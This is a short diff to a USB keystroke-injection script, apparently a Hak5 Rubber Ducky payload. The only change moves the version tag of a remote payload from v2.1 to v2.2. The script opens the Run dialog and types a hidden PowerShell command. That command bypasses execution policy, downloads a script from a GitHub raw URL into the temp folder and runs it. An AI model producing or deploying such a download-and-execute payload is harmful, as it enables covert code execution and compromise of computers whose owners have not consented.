@@ -8,6 +8,6 @@ REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -ExecutionPolicy Bypass -w h -c $f=Join-Path ([IO.Path]::GetTempPath()) 'x2.ps1';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v2.1/s2.ps1 -OutFile $f;& $f
+STRING powershell -ExecutionPolicy Bypass -w h -c $f=Join-Path ([IO.Path]::GetTempPath()) 'x2.ps1';irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v2.2/s2.ps1 -OutFile $f;& $f
 DELAY 500
 ENTER
